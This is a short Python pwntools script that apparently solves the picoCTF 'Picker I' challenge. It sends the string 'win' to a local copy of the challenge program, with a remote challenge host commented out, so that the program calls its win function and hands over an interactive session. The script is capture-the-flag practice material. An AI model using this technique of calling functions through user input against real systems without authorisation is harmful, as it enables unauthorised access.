from pwn import *

# Use process to run the local script
conn = process(['python3', 'picker-I.py'])
#conn = remote('saturn.picoctf.net', 58461)

# Payload to invoke the "win" function
p = "win".encode()  # Convert string to bytes
conn.sendline(p)

# Switch to interactive mode
conn.interactive()
